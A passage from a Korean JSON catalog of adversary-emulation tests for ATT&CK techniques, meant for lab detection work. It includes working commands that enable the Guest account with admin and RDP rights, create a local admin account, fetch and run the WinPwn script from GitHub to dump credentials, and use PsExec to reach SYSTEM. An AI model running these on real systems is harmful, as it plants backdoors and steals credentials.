        "   - `%TEMP%` 경로에 `Folder_to_zip.zip` 생성 여부 확인:",
        "       `Test-Path $env:TEMP\\Folder_to_zip.zip`",
        "   - 포렌식 관점에서, 단기간에 대용량 ZIP이 생성되고 곧이어 네트워크 전송 이벤트(HTTP POST, FTP, 클라우드 동기화 등)가 발생하면 T1074.001 → T1041(Exfil over C2) 또는 T1567(Exfil to Cloud) 체인으로 의심 가능.",
        "",
        "5) 포렌식/탐지 포인트",
        "   - Compress-Archive 호출 로그(PowerShell 4104, ScriptBlockLogging).",
        "   - 평소 사용되지 않던 계정/서버에서 갑자기 Temp 경로에 대용량 ZIP 생성.",
        "   - 동일 이름의 ZIP이 주기적으로 갱신되는 패턴 (스케줄 기반 수집 후 유출).",
        "   - ZIP 내부에 민감 확장자(.docx, .pdf, .xlsx, .pst, .wallet 등)가 다량 포함된 경우.",
        "",
        "6) 정리(Cleanup)",
        "   - 테스트 종료 후에는 `Folder_to_zip.zip` 삭제:",
        "       `Remove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore`"
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Compress-Archive -Path \"PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip\" -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force"
        },
        {
          "executor": "powershell (cleanup)",
          "elevation_required": false,
          "command": "Remove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1078.001",
  "technique_name": "Valid Accounts: Default Accounts",
  "tactic": "Initial Access, Persistence, Privilege Escalation",
  "description": "공격자는 OS 기본으로 존재하는 계정(예: Guest, 내장 Administrator 등)을 활성화하거나 권한을 변경해 유효한 계정으로 악용할 수 있다. 특히 Guest처럼 원래는 비활성화·제한되어야 할 계정을 다시 활성화하고, 관리자·RDP 권한을 부여하면 탐지 우회를 하면서도 지속적인 원격 접속 통로를 확보할 수 있다.",

  "tests": [
    {
      "test_id": "99747561-ed8d-47f2-9c91-1e5fde1ed6e0",
      "name": "Guest 계정 활성화 + 관리자 & RDP 권한 부여",
      "platforms": ["windows"],
      "summary": "기본 Guest 계정을 활성화하고 비밀번호를 설정한 뒤, 로컬 Administrators 그룹과 Remote Desktop Users 그룹에 추가한다. 동시에 레지스트리 설정을 변경해 RDP(원격 데스크톱) 접속을 허용하여, Guest 계정을 통한 원격 관리자 접속 시나리오를 모사한다.",

      "input_arguments": {
        "guest_user": {
          "description": "활성화할 Guest 계정 이름",
          "type": "string",
          "default": "guest"
        },
        "guest_password": {
          "description": "Guest 계정에 설정할 비밀번호",
          "type": "string",
          "default": "Password123!"
        },
        "local_admin_group": {
          "description": "로컬 관리자 그룹 이름 (한글 OS면 'Administrators' 이름이 다를 수 있음)",
          "type": "string",
          "default": "Administrators"
        },
        "remote_desktop_users_group_name": {
          "description": "원격 데스크톱 사용자 그룹 이름",
          "type": "string",
          "default": "Remote Desktop Users"
        },
        "remove_rdp_access_during_cleanup": {
          "description": "정리 단계에서 RDP 접근도 비활성화할지 여부 (1이면 RDP 차단 레지스트리 복원)",
          "type": "integer",
          "default": 0
        }
      },

      "prerequisites": [
        "1) 로컬 관리자 권한(cmd를 관리자 권한으로 실행) 필요.",
        "2) 시스템에 기본 Guest 계정이 존재하고, 현재 비활성화되어 있어야 시나리오가 더 명확하게 재현됨.",
        "3) 로컬 그룹 이름(Administrators, Remote Desktop Users)이 OS 언어/로캘에 맞게 올바른지 확인 필요.",
        "4) RDP 사용이 그룹 정책(GPO)에서 강제로 차단되어 있지 않을 것.",
        "5) 보안 정책상 Guest 계정 활성화가 허용되지 않는 운영 환경에서는 반드시 실험용/랩 환경에서만 수행할 것."
      ],

      "procedure": [
        "1) Guest 계정 활성화 및 비밀번호 설정",
        "   - `net user #{guest_user} /active:yes` 로 Guest 계정을 활성화.",
        "   - `net user #{guest_user} #{guest_password}` 로 해당 계정에 비밀번호를 설정.",
        "",
        "2) Guest 계정을 로컬 관리자 그룹에 추가",
        "   - `net localgroup #{local_admin_group} #{guest_user} /add`",
        "   - 이를 통해 Guest 계정이 관리자 권한을 획득(Privilege Escalation + Persistence)하는 시나리오를 모사.",
        "",
        "3) Guest 계정을 Remote Desktop Users 그룹에 추가",
        "   - `net localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add`",
        "   - 원격 데스크톱 접속이 가능한 그룹에 포함시켜, Guest 계정으로 RDP 접속을 허용.",
        "",
        "4) RDP 연결 허용을 위한 레지스트리 설정 변경",
        "   - `reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f`",
        "   - `reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f`",
        "   - 위 설정으로 RDP 접속 거부를 해제하고, 원격 연결을 허용.",
        "",
        "5) 탐지/포렌식 포인트",
        "   - 보안/시스템 로그에서 `net user`, `net localgroup` 실행 흔적 및 계정/그룹 변경 이벤트(Security 4720, 4728 등) 확인.",
        "   - 레지스트리 키 `HKLM\\System\\CurrentControlSet\\Control\\Terminal Server` 변경 이벤트 모니터링.",
        "   - 비정상적으로 Guest 계정이 활성화되었거나 관리자 그룹에 속해 있는지 정기 점검.",
        "",
        "6) 정리(Cleanup) 시나리오",
        "   - Guest 계정 다시 비활성화, 관리자 및 RDP 그룹에서 제거.",
        "   - `remove_rdp_access_during_cleanup` 값이 1이면 RDP 설정을 이전 상태로 복원."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "net user #{guest_user} /active:yes\r\nnet user #{guest_user} #{guest_password}\r\nnet localgroup #{local_admin_group} #{guest_user} /add\r\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\r\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\r\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f"
        },
        {
          "executor": "command_prompt (cleanup)",
          "elevation_required": true,
          "command": "net user #{guest_user} /active:no >nul 2>&1\r\nnet localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1\r\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete >nul 2>&1\r\nif #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)\r\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)\r\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f >nul 2>&1)"
        }
      ]
    },

    {
      "test_id": "aa6cb8c4-b582-4f8e-b677-37733914abda",
      "name": "기본 Guest 계정 단순 활성화",
      "platforms": ["windows"],
      "summary": "기본 Guest 계정을 단순 활성화(Active: yes)만 수행하는 테스트로, 공격자가 별도 계정 생성 없이 기본 제공 계정을 되살려 사용하는 최소 시나리오를 모사한다.",

      "input_arguments": {
        "guest_user": {
          "description": "활성화할 Guest 계정 이름",
          "type": "string",
          "default": "guest"
        }
      },

      "prerequisites": [
        "1) 로컬 관리자 권한 필요.",
        "2) 시스템에 `#{guest_user}` 이름의 기본 Guest 계정이 존재해야 함.",
        "3) 조직 정책에서 Guest 계정을 엄격히 금지한다면, 반드시 분리된 랩 환경에서만 테스트할 것.",
        "4) 계정 상태 변경(활성/비활성) 이벤트가 감사 로그에 기록되는지 확인하면 탐지 규칙 설계에 도움이 됨."
      ],

      "procedure": [
        "1) Guest 계정 활성화",
        "   - 명령:",
        "       `net user #{guest_user} /active:yes`",
        "   - 이로 인해 기본 Guest 계정이 로그인 가능한 상태가 되며, 추가 권한 설정이 없더라도 로컬 로그인/네트워크 로그인 등에 사용될 수 있음.",
        "",
        "2) 포렌식/탐지 포인트",
        "   - 보안 로그에서 계정 상태 변경 이벤트 (예: Event ID 4722 - 'A user account was enabled').",
        "   - 평소 사용되지 않던 Guest 계정으로의 로그인 시도/성공 이벤트 (4624, 4625 등) 모니터링.",
        "   - 로컬/도메인 보안 베이스라인에서 ‘Guest 계정은 항상 비활성화’ 상태여야 한다는 기준과 비교.",
        "",
        "3) 테스트 종료 후 정리",
        "   - Guest 계정을 다시 비활성화:",
        "       `net user #{guest_user} /active:no`",
        "   - 실 운영 환경에서는 이 정리 단계가 반드시 수행되었는지 별도로 검증 필요."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "net user #{guest_user} /active:yes"
        },
        {
          "executor": "command_prompt (cleanup)",
          "elevation_required": true,
          "command": "net user #{guest_user} /active:no"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1078.003",
  "technique_name": "Valid Accounts: Local Accounts",
  "tactic": "Initial Access, Persistence, Privilege Escalation",
  "description": "공격자는 로컬 계정을 새로 만들거나 기존 로컬 계정을 재활용해 유효한 계정 형태로 시스템에 접근할 수 있다. 특히 관리자 그룹에 포함된 로컬 계정을 만들거나 재활성화하면, 원격 접속·권한 상승·지속성 확보에 모두 활용될 수 있다.",

  "tests": [
    {
      "test_id": "a524ce99-86de-4db6-b4f9-e08f35a47a15",
      "name": "로컬 관리자 계정 생성 (art-test)",
      "platforms": ["windows"],
      "summary": "새로운 로컬 계정 art-test를 생성하고, 비밀번호를 설정한 뒤, 로컬 Administrators 그룹에 추가하여 관리자 권한 로컬 계정을 만드는 시나리오를 모사한다.",

      "input_arguments": {
        "password": {
          "description": "art-test 사용자 비밀번호",
          "type": "string",
          "default": "-4RTisCool!-321"
        }
      },

      "prerequisites": [
        "1) 명령 프롬프트를 '관리자 권한'으로 실행해야 한다.",
        "2) 시스템에 이미 art-test 라는 이름의 계정이 없어야 한다(중복 시 명령 실패).",
        "3) 로컬 그룹 이름 'administrators' 가 OS 언어/로캘에 맞는지 확인(한국어 환경에서는 이름이 다를 수 있음).",
        "4) 로컬 계정 생성 및 비밀번호 정책(복잡도, 최소 길이 등)을 충족하는 비밀번호를 사용해야 한다."
      ],

      "procedure": [
        "1) 로컬 계정 art-test 생성",
        "   - 명령: `net user art-test /add`",
        "   - 설명: 로컬 SAM 데이터베이스에 art-test 사용자 계정을 추가한다(기본은 비활성/미지정 비밀번호 상태 아님, 다만 로그인에 사용할 비밀번호를 별도 설정해야 실제 사용 가능).",
        "",
        "2) art-test 계정 비밀번호 설정",
        "   - 명령: `net user art-test #{password}`",
        "   - 설명: 제공된 입력 인자 `password` 값으로 art-test 계정의 비밀번호를 설정한다.",
        "",
        "3) art-test를 Administrators 그룹에 추가",
        "   - 명령: `net localgroup administrators art-test /add`",
        "   - 설명: 로컬 관리자 그룹에 새 계정을 포함시켜, 해당 계정으로 로그인 시 관리자 권한을 가지도록 한다.",
        "",
        "4) 탐지/포렌식 포인트",
        "   - 보안 로그에서 계정 생성 이벤트(예: 4720), 그룹 변경 이벤트(4728) 등을 모니터링.",
        "   - `net user`, `net localgroup` 실행 흔적 및 프로세스 생성(Event ID 4688) 추적.",
        "   - 비정상적인 신규 로컬 관리자 계정 존재 여부에 대한 주기적인 점검.",
        "",
        "5) 테스트 종료 후 정리",
        "   - art-test를 Administrators 그룹에서 제거하고, 계정 자체를 삭제.",
        "   - 실환경에서는 테스트 후 반드시 계정 삭제 여부를 확인해야 한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "net user art-test /add\r\nnet user art-test #{password}\r\nnet localgroup administrators art-test /add"
        },
        {
          "executor": "command_prompt (cleanup)",
          "elevation_required": true,
          "command": "net localgroup administrators art-test /delete >nul 2>&1\r\nnet user art-test /delete >nul 2>&1"
        }
      ]
    },

    {
      "test_id": "9e9fd066-453d-442f-88c1-ad7911d32912",
      "name": "WinPwn – 로컬 크리덴셜 수집 (powerhell kittie)",
      "platforms": ["windows"],
      "summary": "WinPwn.ps1 스크립트를 다운로드·로드한 후, `obfuskittiedump` 함수를 사용해 로컬 자격증명(cred)을 수집하는 시나리오를 모사한다. 공격자가 생성한/탈취한 로컬 계정을 활용해 추가 권한 확보와 크리덴셜 덤프를 수행하는 상황에 해당한다.",

      "input_arguments": {},

      "prerequisites": [
        "1) PowerShell 실행 정책이 스크립트 실행을 허용하거나, Bypass 옵션 등을 통해 우회 가능해야 한다.",
        "2) 인터넷에 접근 가능하고, `raw.githubusercontent.com` 도메인에 대한 접속이 허용되어 있어야 한다.",
        "3) 로컬 관리자 또는 SYSTEM 수준 권한이 있어야 LSASS 등의 민감 프로세스에서 크리덴셜 덤프가 가능하다.",
        "4) AV/EDR가 WinPwn 또는 메모리 덤프 행위를 차단하지 않도록 실험용 환경에서 사용해야 한다."
      ],

      "procedure": [
        "1) WinPwn.ps1 다운로드 및 메모리 상 로드",
        "   - 명령:",
        "       `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`",
        "   - 설명: `Net.WebClient` 를 이용해 WinPwn.ps1 내용을 문자열로 다운로드한 뒤, `iex` 로 즉시 실행(메모리 로드)한다.",
        "",
        "2) obfuskittiedump 함수 실행",
        "   - 명령:",
        "       `obfuskittiedump -consoleoutput -noninteractive`",
        "   - 설명: WinPwn 내 obfuskittiedump 기능을 호출하여 로컬 자격증명을 추출하고, 콘솔에 결과를 출력한다(비대화식).",
        "",
        "3) 탐지/포렌식 포인트",
        "   - PowerShell 로그(Operational, ScriptBlockLogging)에서 `downloadstring`, `iex`, WinPwn 관련 스트링 탐지.",
        "   - 의심스러운 메모리 읽기/덤프 이벤트(예: LSASS 접근) 모니터링.",
        "   - 비정상적인 계정 사용 + 크리덴셜 덤프 도구 호출을 연관 분석(UEBA, SIEM 규칙 등)."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\r\nobfuskittiedump -consoleoutput -noninteractive"
        }
      ]
    },

    {
      "test_id": "e9fdb899-a980-4ba4-934b-486ad22e22f4",
      "name": "WinPwn – 로컬 크리덴셜 수집 (Safetykatz)",
      "platforms": ["windows"],
      "summary": "WinPwn.ps1 스크립트를 로드한 뒤, `safedump` 기능을 사용해 Mimikatz 유사(Safetykatz) 기법으로 로컬 크리덴셜을 덤프하는 시나리오를 재현한다.",

      "input_arguments": {},

      "prerequisites": [
        "1) 관리자 권한 또는 SYSTEM 권한 필요.",
        "2) PowerShell 실행 정책이 우회를 허용하거나 Bypass 등을 통해 우회해야 한다.",
        "3) 인터넷 환경에서 GitHub(raw.githubusercontent.com)에 접속 가능해야 한다.",
        "4) AV/EDR에서 Safetykatz/ Mimikatz 계열 도구를 차단하지 않는 테스트 전용 환경이어야 한다."
      ],

      "procedure": [
        "1) WinPwn.ps1 다운로드 및 로드",
        "   - 명령:",
        "       `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`",
        "",
        "2) safedump 함수 호출",
        "   - 명령:",
        "       `safedump -consoleoutput -noninteractive`",
        "   - 설명: Mimikatz 유사 동작을 수행하는 Safetykatz 기반 크리덴셜 덤프를 실행하고, 콘솔에 결과를 출력한다.",
        "",
        "3) 탐지/포렌식 포인트",
        "   - PowerShell ScriptBlock 로그에서 WinPwn·Safetykatz 관련 함수 호출 감시.",
        "   - LSASS 프로세스 핸들 접근 이벤트, 메모리 덤프 도구 실행 기록 등 수집.",
        "   - 비정상 로컬 계정/관리자 계정 로그인 직후 이러한 도구 실행 여부 상관 분석."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\r\nsafedump -consoleoutput -noninteractive"
        }
      ]
    },

    {
      "test_id": "6904235f-0f55-4039-8aed-41c300ff7733",
      "name": "PsExec를 이용한 NT AUTHORITY\\SYSTEM 권한 획득",
      "platforms": ["windows"],
      "summary": "Sysinternals의 PsExec를 이용해 로컬 시스템 계정(NT AUTHORITY\\SYSTEM)으로 cmd.exe를 실행하고, whoami를 수행해 SYSTEM 권한 획득을 확인하는 시나리오를 모사한다. 공격자가 로컬 계정을 이용해 추가 권한 상승을 시도하는 대표적인 패턴이다.",

      "input_arguments": {},

      "prerequisites": [
        "1) PsExec.exe가 `PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe` 경로에 존재해야 한다.",
        "2) 명령 프롬프트를 관리자 권한으로 실행해야 한다.",
        "3) PsExec EULA를 최초 실행 시 수락해야 하며, 일부 AV/EDR 에서 PsExec를 차단할 수 있음.",
        "4) 로컬 계정이 이미 관리자 권한을 갖고 있어야 SYSTEM으로의 전환이 가능하다."
      ],

      "procedure": [
        "1) 사전 준비(Atomic 원문 기준)",
        "   - (의존성) `PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe` 가 없으면, PSTools.zip 다운로드 후 압축을 풀어 PsExec.exe를 지정 경로에 복사.",
        "",
        "2) PsExec를 이용해 SYSTEM 권한 쉘 호출",
        "   - 명령:",
        "       `\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami`",
        "   - 옵션 설명:",
        "       - `-accepteula` : EULA(라이선스 동의)를 자동으로 수락.",
        "       - `-s` : 프로세스를 Local System 계정으로 실행.",
        "       - `%COMSPEC% /c whoami` : 기본 cmd.exe로 `whoami` 명령을 실행하고 종료.",
        "",
        "3) 기대 결과",
        "   - 콘솔 출력에 `nt authority\\system` 이 표시되면 SYSTEM 권한 실행에 성공한 것.",
        "",
        "4) 탐지/포렌식 포인트",
        "   - PsExec.exe 실행 흔적(프로세스 생성 로그, 명령줄 인자, 경로).",
        "   - 보안 로그에서 권한 상승 이벤트, 토큰 조작, 서비스 생성/삭제 여부.",
        "   - SYSTEM 계정에서 예상치 못한 명령/도구 실행 패턴 탐지(예: whoami, ipconfig, net user 등)."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1082",
  "technique_name": "System Information Discovery",
  "tactic": "Discovery",
  "description": "공격자는 시스템의 하드웨어 스펙, OS 버전, 환경 변수, 지역·언어 설정, BIOS 정보 등을 수집해 호스트 특성과 가상화 여부, 권한 상승 가능성 등을 파악한다. 이 정보는 이후 권한 상승, 탐지 회피, 환경 맞춤형 페이로드 선택에 활용된다. 단순 명령어부터 WinPwn·PowerSharpPack과 같은 자동화 스크립트까지 다양한 도구가 사용된다.",
  "tests": [
    {
      "test_id": "T1082-1",
      "name": "System Information Discovery (systeminfo + Disk Enum)",
      "platforms": ["windows"],
      "summary": "systeminfo와 디스크 Enum 레지스트리 키를 통해 OS와 디스크 정보를 수집하는 기본 시스템 정찰 동작을 모사한다.",
      "procedure": [
        "CMD에서 systeminfo를 실행해 OS·메모리·핫픽스 정보 등을 수집한다.",
        "reg query로 HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum 키를 조회해 디스크 장치 정보를 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "systeminfo & reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
        }
      ],
      "prerequisites": [
        "로컬 시스템에서 CMD 실행이 가능해야 한다.",
        "레지스트리 읽기 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
            "description": "디스크 장치 열거 정보가 포함된 레지스트리 키"
          }
        ],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "systeminfo 및 reg.exe를 실행하는 콘솔 프로세스",
            "commandline_pattern": "systeminfo*"
          },
          {
            "name": "reg.exe",
            "description": "Disk Enum 키 조회에 사용",
            "commandline_pattern": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회성 명령만 수행하므로 별도의 정리 단계는 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "66703791-c902-4560-8770-42b8a91f7667"
      }
    },
    {
      "test_id": "T1082-2",
      "name": "Hostname Discovery (Windows)",
      "platforms": ["windows"],
      "summary": "hostname 명령으로 시스템의 호스트 이름을 수집하는 간단한 정찰 기법을 모사한다.",
      "procedure": [
        "CMD에서 hostname 명령을 실행한다.",
        "출력된 호스트 이름을 기록한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "hostname"
        }
      ],
      "prerequisites": [
        "CMD 실행 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "hostname 명령 실행에 사용",
            "commandline_pattern": "hostname"
          }
        ],
        "network": []
      },
      "cleanup": [
        "별도의 정리 필요 없음."
      ],
      "metadata": {
        "atomic_source_id": "85cfbf23-4a1e-4342-8792-007e004b975f"
      }
    },
    {
      "test_id": "T1082-3",
      "name": "Windows MachineGUID Discovery",
      "platforms": ["windows"],
      "summary": "레지스트리의 MachineGuid 값을 조회해 시스템 고유 식별자를 수집하는 정찰 동작을 모사한다.",
      "procedure": [
        "reg query로 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography 키를 조회한다.",
        "MachineGuid 값을 읽어 고유 식별자로 활용한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid"
        }
      ],
      "prerequisites": [
        "레지스트리 HKLM 영역 읽기 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Cryptography",
            "description": "MachineGuid 값이 저장된 레지스트리 키"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "MachineGuid 조회에 사용",
            "commandline_pattern": "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회만 수행하므로 정리 불필요."
      ],
      "metadata": {
        "atomic_source_id": "224b4daf-db44-404e-b6b2-f4d1f0126ef8"
      }
    },
    {
      "test_id": "T1082-4",
      "name": "Griffon Recon VBS 스크립트 실행",
      "platforms": ["windows"],
      "summary": "Griffon 악성코드 계열에서 사용된 정찰 VBS 스크립트를 로컬에서 실행해 OS·브라우저·네트워크 정보를 수집하는 행위를 모사한다.",
      "procedure": [
        "지정된 경로에 griffon_recon.vbs 파일이 존재하는지 확인하거나 원격 저장소에서 다운로드한다.",
        "PowerShell에서 cscript를 호출해 VBS 스크립트를 실행하고 결과를 출력한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "cscript \"#{vbscript}\""
        }
      ],
      "prerequisites": [
        "griffon_recon.vbs 파일이 로컬 디스크에 존재해야 한다.",
        "없을 경우 GitHub에서 해당 스크립트를 다운로드해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs",
            "description": "원격 저장소에서 내려받은 Griffon 정찰용 VBS 스크립트"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cscript.exe",
            "description": "griffon_recon.vbs 실행에 사용되는 Windows Script Host 콘솔 버전",
            "commandline_pattern": "cscript *griffon_recon.vbs*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트 후 griffon_recon.vbs를 삭제해도 된다."
      ],
      "metadata": {
        "atomic_source_id": "69bd4abe-8759-49a6-8d21-0f15822d6370"
      }
    },
    {
      "test_id": "T1082-5",
      "name": "환경 변수 열람 (set 명령)",
      "platforms": ["windows"],
      "summary": "CMD의 set 명령을 사용해 현재 세션의 모든 환경 변수를 열람하는 정찰 동작을 모사한다.",
      "procedure": [
        "CMD에서 set 명령을 실행한다.",
        "출력된 환경 변수를 통해 PATH, TEMP, 사용자 프로필 경로 등을 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "set"
        }
      ],
      "prerequisites": [
        "CMD 실행 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "set 명령 실행에 사용",
            "commandline_pattern": "set"
          }
        ],
        "network": []
      },
      "cleanup": [
        "추가 정리 단계는 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "f400d1c0-1804-4ff8-b069-ef5ddd2adbf3"
      }
    },
    {
      "test_id": "T1082-6",
      "name": "WinPwn - winPEAS 기반 LPE 정찰",
      "platforms": ["windows"],
      "summary": "WinPwn 스크립트에서 winPEAS 함수를 호출해 로컬 권한 상승(Privilege Escalation)과 관련된 취약 구성을 자동 점검하는 시나리오를 모사한다.",
      "procedure": [
        "PowerShell에서 WinPwn.ps1을 원격 저장소(GitHub)에서 다운로드해 메모리로 로드한다.",
        "winPEAS -noninteractive -consoleoutput을 실행해 LPE 가능성 정보를 수집한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); winPEAS -noninteractive -consoleoutput"
        }
      ],
      "prerequisites": [
        "인터넷 연결과 GitHub 접근이 가능해야 한다.",
        "PowerShell 실행 정책이 원격 스크립트 실행을 허용해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WinPwn 및 winPEAS 실행에 사용",
            "commandline_pattern": "*WinPwn.ps1*winPEAS*"
          }
        ],
        "network": [
          {
            "description": "GitHub raw 콘텐츠(WinPwn.ps1)로의 HTTP/HTTPS 요청"
          }
        ]
      },
      "cleanup": [
        "파일을 생성하지 않고 콘솔 출력 위주로 동작하므로 별도 정리가 필요 없지만, 프록시/방화벽 로그에는 GitHub 접속 흔적이 남을 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "eea1d918-825e-47dd-acc2-814d6c58c0e1"
      }
    },
    {
      "test_id": "T1082-7",
      "name": "WinPwn - itm4nprivesc LPE 정찰",
      "platforms": ["windows"],
      "summary": "WinPwn의 itm4nprivesc 기능을 사용해 서비스 구성, ACL, UAC 설정 등 권한 상승에 악용 가능한 요소를 자동 점검하는 정찰 동작을 모사한다.",
      "procedure": [
        "WinPwn.ps1을 다운로드해 메모리로 로드한다.",
        "itm4nprivesc -noninteractive -consoleoutput 명령을 실행해 결과를 수집한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); itm4nprivesc -noninteractive -consoleoutput"
        }
      ],
      "prerequisites": [
        "인터넷 연결 및 PowerShell 스크립트 실행 허용."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "itm4nprivesc 실행에 사용",
            "commandline_pattern": "*itm4nprivesc*"
          }
        ],
        "network": [
          {
            "description": "GitHub WinPwn 리포지토리 접근 트래픽"
          }
        ]
      },
      "cleanup": [
        "별도 파일 생성이 없으므로 정리 단계는 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "3d256a2f-5e57-4003-8eb6-64d91b1da7ce"
      }
    },
    {
      "test_id": "T1082-8",
      "name": "WinPwn - Powersploits privesc checks (oldchecks)",
      "platforms": ["windows"],
      "summary": "WinPwn의 oldchecks 기능을 통해 Powersploit 기반 권한 상승 체크를 수행하고, 결과 폴더를 여럿 생성하는 동작을 모사한다.",
      "procedure": [
        "WinPwn.ps1을 다운로드해 로드한다.",
        "oldchecks -noninteractive -consoleoutput으로 다양한 LPE 관련 체크를 수행한다.",
        "정리 시 생성된 결과 폴더들을 삭제한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); oldchecks -noninteractive -consoleoutput"
        }
      ],
      "prerequisites": [
        "인터넷 연결 및 PowerShell 스크립트 실행 허용."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": ".\\DomainRecon",
            "description": "도메인 정찰 결과 디렉터리"
          },
          {
            "path": ".\\Exploitation",
            "description": "익스플로잇 관련 정보 디렉터리"
          },
